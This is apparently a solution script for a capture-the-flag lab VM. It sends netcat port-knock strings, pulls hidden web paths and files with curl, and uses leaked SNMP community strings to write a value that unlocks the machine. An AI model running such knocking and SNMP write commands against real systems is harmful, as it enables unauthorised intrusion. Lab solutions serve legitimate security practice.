VM_IP="IP Here";
echo opensesame | nc -uv $VM_IP 666 -q0;
curl -X GET "http://$VM_IP/";
curl -X GET "http://$VM_IP/amagicbridgeappearsatthechasm/";
curl -X GET "http://$VM_IP/amagicbridgeappearsatthechasm/talisman" -o /tmp/bla;
echo blackmagic | nc -uv $VM_IP 31337 -q0;
curl "http://$VM_IP/thenecromancerwillabsorbyoursoul/";
curl -X GET "http://$VM_IP/thenecromancerwillabsorbyoursoul/necromancer" -o /tmp/bla;
snmpwalk -v 2c -c death2all $VM_IP;
snmpset -v 2c -c death2allrw $VM_IP iso.3.6.1.2.1.1.6.0 s "Unlocked"
snmpwalk -v 2c -c death2all $VM_IP
